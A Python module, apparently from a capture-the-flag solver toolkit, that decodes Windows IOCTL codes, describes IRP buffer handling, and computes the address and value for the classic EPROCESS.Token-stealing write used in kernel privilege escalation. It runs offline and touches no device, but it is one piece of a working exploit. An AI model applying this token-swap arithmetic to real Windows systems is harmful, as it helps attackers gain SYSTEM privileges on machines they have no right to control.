#!/usr/bin/env python3
"""Exact offline Windows kernel wire/layout primitives.

The module decodes the documented ``CTL_CODE`` bit layout, describes how an
IOCTL's transfer method carries its two buffers, and performs the arithmetic
for one caller-parameterized x64 ``EPROCESS.Token`` transfer.  It never opens a
device, reads kernel memory, executes a payload, contacts a target, or submits
anything.  Windows structure offsets and values must come from the exact
challenge build; none are guessed here.

References:
  * Microsoft, "Defining I/O control codes"
  * Microsoft, "Buffer Descriptions for I/O Control Codes"

CLI examples::

    ./.venv/bin/python solvers/toolkits/pwnkern_windows_kernel.py decode 0x70000
    ./.venv/bin/python solvers/toolkits/pwnkern_windows_kernel.py encode 7 0 0 0
    ./.venv/bin/python solvers/toolkits/pwnkern_windows_kernel.py buffers 0x2d4800 0 24
    ./.venv/bin/python solvers/toolkits/pwnkern_windows_kernel.py token-transfer \
        0xffff800000001000 0xffff800000002000 0x4b8 \
        0xffff900000003007 0xffff900000004003 4
"""
from __future__ import annotations

import argparse
from dataclasses import dataclass
import json
import sys
from typing import Any


UINT32_MAX = (1 << 32) - 1
UINT64_MAX = (1 << 64) - 1

METHOD_NAMES = {
    0: "METHOD_BUFFERED",
    1: "METHOD_IN_DIRECT",
    2: "METHOD_OUT_DIRECT",
    3: "METHOD_NEITHER",
}

ACCESS_NAMES = {
    0: "FILE_ANY_ACCESS",
    1: "FILE_READ_ACCESS",
    2: "FILE_WRITE_ACCESS",
    3: "FILE_READ_ACCESS|FILE_WRITE_ACCESS",
}


class PwnkernWindowsError(ValueError):
    """Invalid, unsupported, or non-representable Windows kernel input."""


def _uint(value: object, bits: int, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int):
        raise PwnkernWindowsError(f"{name} must be an integer")
    maximum = (1 << bits) - 1
    if not 0 <= value <= maximum:
        raise PwnkernWindowsError(f"{name} must fit in {bits} unsigned bits")
    return value


def _add_u64(base: int, offset: int, name: str) -> int:
    if offset > UINT64_MAX - base:
        raise PwnkernWindowsError(f"{name} address arithmetic overflows 64 bits")
    return base + offset


@dataclass(frozen=True)
class IoctlFields:
    """One exact decomposition of a 32-bit Windows IOCTL value."""

    code: int
    device_type: int
    function: int
    method: int
    access: int
    method_name: str
    access_name: str
    vendor_device_type: bool
    vendor_function: bool

    def as_dict(self) -> dict[str, Any]:
        return {
            "code": self.code,
            "code_hex": f"0x{self.code:08x}",
            "device_type": self.device_type,
            "device_type_hex": f"0x{self.device_type:04x}",
            "function": self.function,
            "function_hex": f"0x{self.function:03x}",
            "method": self.method,
            "method_name": self.method_name,
            "access": self.access,
            "access_name": self.access_name,
            "vendor_device_type": self.vendor_device_type,
            "vendor_function": self.vendor_function,
        }


@dataclass(frozen=True)
class DeviceIoControlContract:
    """Documented IRP carriers for one DeviceIoControl request shape."""

    fields: IoctlFields
    input_length: int
    output_length: int
    input_carrier: str
    output_carrier: str
    system_buffer_size: int
    mdl_length: int
    raw_user_pointers: bool
    io_manager_access: str

    def as_dict(self) -> dict[str, Any]:
        return {
            "ioctl": self.fields.as_dict(),
            "input_length": self.input_length,
            "output_length": self.output_length,
            "input_carrier": self.input_carrier,
            "output_carrier": self.output_carrier,
            "system_buffer_size": self.system_buffer_size,
            "mdl_length": self.mdl_length,
            "raw_user_pointers": self.raw_user_pointers,
            "io_manager_access": self.io_manager_access,
        }


@dataclass(frozen=True)
class TokenTransfer:
    """Exact x64 EX_FAST_REF arithmetic and the resulting eight-byte write."""

    current_eprocess: int
    system_eprocess: int
    token_offset: int
    current_token_address: int
    system_token_address: int
    current_token_value: int
    system_token_value: int
    ref_bits: int
    reference_mask: int
    pointer_mask: int
    system_token_pointer: int
    preserved_reference_bits: int
    write_address: int
    write_value: int
    write_bytes: bytes

    def as_dict(self) -> dict[str, Any]:
        hexadecimal = {
            "current_eprocess": self.current_eprocess,
            "system_eprocess": self.system_eprocess,
            "token_offset": self.token_offset,
            "current_token_address": self.current_token_address,
            "system_token_address": self.system_token_address,
            "current_token_value": self.current_token_value,
            "system_token_value": self.system_token_value,
            "reference_mask": self.reference_mask,
            "pointer_mask": self.pointer_mask,
            "system_token_pointer": self.system_token_pointer,
            "preserved_reference_bits": self.preserved_reference_bits,
            "write_address": self.write_address,
            "write_value": self.write_value,
        }
        return {
            **hexadecimal,
            **{f"{name}_hex": f"0x{value:x}" for name, value in hexadecimal.items()},
            "ref_bits": self.ref_bits,
            "write_width": 8,
            "write_endian": "little",
            "write_bytes_hex": self.write_bytes.hex(),
            "operation": "write replacement EX_FAST_REF to current EPROCESS.Token",
            "delivery": "offline-only",
        }


def encode_ioctl(device_type: int, function: int, method: int, access: int) -> int:
    """Apply Microsoft's exact ``CTL_CODE`` macro to validated integer fields."""

    device = _uint(device_type, 16, "device_type")
    operation = _uint(function, 12, "function")
    transfer = _uint(method, 2, "method")
    required_access = _uint(access, 2, "access")
    return (
        (device << 16)
        | (required_access << 14)
        | (operation << 2)
        | transfer
    )


def decode_ioctl(code: int) -> IoctlFields:
    """Decode all documented fields from one exact 32-bit IOCTL value."""

    value = _uint(code, 32, "code")
    method = value & 0x3
    function = (value >> 2) & 0xFFF
    access = (value >> 14) & 0x3
    device_type = (value >> 16) & 0xFFFF
    return IoctlFields(
        code=value,
        device_type=device_type,
        function=function,
        method=method,
        access=access,
        method_name=METHOD_NAMES[method],
        access_name=ACCESS_NAMES[access],
        vendor_device_type=bool(device_type & 0x8000),
        vendor_function=bool(function & 0x800),
    )


def plan_device_io_control(
    code: int,
    *,
    input_length: int,
    output_length: int,
) -> DeviceIoControlContract:
    """Describe the documented IRP buffer carriers without opening a device."""

    fields = decode_ioctl(code)
    input_size = _uint(input_length, 32, "input_length")
    output_size = _uint(output_length, 32, "output_length")

    if fields.method == 0:
        return DeviceIoControlContract(
            fields, input_size, output_size,
            "Irp.AssociatedIrp.SystemBuffer",
            "Irp.AssociatedIrp.SystemBuffer",
            max(input_size, output_size), 0, False,
            "I/O manager copies both directions through one system buffer",
        )
    if fields.method == 1:
        return DeviceIoControlContract(
            fields, input_size, output_size,
            "Irp.AssociatedIrp.SystemBuffer",
            "Irp.MdlAddress",
            input_size, output_size, False,
            "MDL grants read access for caller-to-driver second-buffer data",
        )
    if fields.method == 2:
        return DeviceIoControlContract(
            fields, input_size, output_size,
            "Irp.AssociatedIrp.SystemBuffer",
            "Irp.MdlAddress",
            input_size, output_size, False,
            "MDL grants write access for driver-to-caller second-buffer data",
        )
    return DeviceIoControlContract(
        fields, input_size, output_size,
        "IoStackLocation.Parameters.DeviceIoControl.Type3InputBuffer",
        "Irp.UserBuffer",
        0, 0, True,
        "I/O manager supplies raw user virtual addresses without validation or mapping",
    )


def build_token_transfer(
    *,
    current_eprocess: int,
    system_eprocess: int,
    token_offset: int,
    current_token_value: int,
    system_token_value: int,
    ref_bits: int,
) -> TokenTransfer:
    """Build one x64 EX_FAST_REF token-transfer write record.

    ``current_token_value`` and ``system_token_value`` are the exact 64-bit
    values read from the two caller-specified ``EPROCESS.Token`` fields.  The
    SYSTEM token's pointer portion is combined with the current process's low
    reference bits.  ``ref_bits`` is explicit because this module refuses to
    infer a layout from an unspecified Windows build.
    """

    current = _uint(current_eprocess, 64, "current_eprocess")
    system = _uint(system_eprocess, 64, "system_eprocess")
    if current == system:
        raise PwnkernWindowsError("current_eprocess and system_eprocess must differ")
    if current & 0x7 or system & 0x7:
        raise PwnkernWindowsError("EPROCESS addresses must be eight-byte aligned")

    offset = _uint(token_offset, 32, "token_offset")
    if offset & 0x7:
        raise PwnkernWindowsError("token_offset must be eight-byte aligned")
    current_value = _uint(current_token_value, 64, "current_token_value")
    system_value = _uint(system_token_value, 64, "system_token_value")
    bits = _uint(ref_bits, 8, "ref_bits")
    if not 1 <= bits <= 8:
        raise PwnkernWindowsError("ref_bits must be in 1..8")

    reference_mask = (1 << bits) - 1
    pointer_mask = UINT64_MAX ^ reference_mask
    system_pointer = system_value & pointer_mask
    if system_pointer == 0:
        raise PwnkernWindowsError("system_token_value has a null pointer portion")
    if current_value & pointer_mask == 0:
        raise PwnkernWindowsError("current_token_value has a null pointer portion")

    current_address = _add_u64(current, offset, "current token")
    system_address = _add_u64(system, offset, "system token")
    preserved = current_value & reference_mask
    replacement = system_pointer | preserved
    try:
        serialized = replacement.to_bytes(8, "little", signed=False)
    except (OverflowError, ValueError) as exc:  # defensive: validated arithmetic should preclude this
        raise PwnkernWindowsError("replacement token cannot be serialized") from exc

    return TokenTransfer(
        current_eprocess=current,
        system_eprocess=system,
        token_offset=offset,
        current_token_address=current_address,
        system_token_address=system_address,
        current_token_value=current_value,
        system_token_value=system_value,
        ref_bits=bits,
        reference_mask=reference_mask,
        pointer_mask=pointer_mask,
        system_token_pointer=system_pointer,
        preserved_reference_bits=preserved,
        write_address=current_address,
        write_value=replacement,
        write_bytes=serialized,
    )


def _cli_integer(text: str) -> int:
    try:
        return int(text, 0)
    except (TypeError, ValueError) as exc:
        raise argparse.ArgumentTypeError("expected an integer (decimal or 0x-prefixed)") from exc


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    commands = parser.add_subparsers(dest="command", required=True)

    decode = commands.add_parser("decode", help="decode one 32-bit IOCTL")
    decode.add_argument("code", type=_cli_integer)

    encode = commands.add_parser("encode", help="apply CTL_CODE to four integer fields")
    encode.add_argument("device_type", type=_cli_integer)
    encode.add_argument("function", type=_cli_integer)
    encode.add_argument("method", type=_cli_integer)
    encode.add_argument("access", type=_cli_integer)

    buffers = commands.add_parser("buffers", help="describe DeviceIoControl IRP carriers")
    buffers.add_argument("code", type=_cli_integer)
    buffers.add_argument("input_length", type=_cli_integer)
    buffers.add_argument("output_length", type=_cli_integer)

    token = commands.add_parser("token-transfer", help="compute one x64 EX_FAST_REF write")
    token.add_argument("current_eprocess", type=_cli_integer)
    token.add_argument("system_eprocess", type=_cli_integer)
    token.add_argument("token_offset", type=_cli_integer)
    token.add_argument("current_token_value", type=_cli_integer)
    token.add_argument("system_token_value", type=_cli_integer)
    token.add_argument("ref_bits", type=_cli_integer)
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = _parser()
    try:
        raw_argv = None if argv is None else list(argv)
    except Exception:
        print("pwnkern_windows_kernel: malformed argv", file=sys.stderr)
        return 2
    try:
        args = parser.parse_args(raw_argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2

    try:
        if args.command == "decode":
            result: Any = decode_ioctl(args.code).as_dict()
        elif args.command == "encode":
            code = encode_ioctl(args.device_type, args.function, args.method, args.access)
            result = decode_ioctl(code).as_dict()
        elif args.command == "buffers":
            result = plan_device_io_control(
                args.code,
                input_length=args.input_length,
                output_length=args.output_length,
            ).as_dict()
        else:
            result = build_token_transfer(
                current_eprocess=args.current_eprocess,
                system_eprocess=args.system_eprocess,
                token_offset=args.token_offset,
                current_token_value=args.current_token_value,
                system_token_value=args.system_token_value,
                ref_bits=args.ref_bits,
            ).as_dict()
        print(json.dumps(result, indent=2, sort_keys=True))
        return 0
    except PwnkernWindowsError as exc:
        print(f"pwnkern_windows_kernel: {exc}", file=sys.stderr)
        return 2


__all__ = [
    "ACCESS_NAMES",
    "METHOD_NAMES",
    "DeviceIoControlContract",
    "IoctlFields",
    "PwnkernWindowsError",
    "TokenTransfer",
    "build_token_transfer",
    "decode_ioctl",
    "encode_ioctl",
    "main",
    "plan_device_io_control",
]


if __name__ == "__main__":
    raise SystemExit(main())
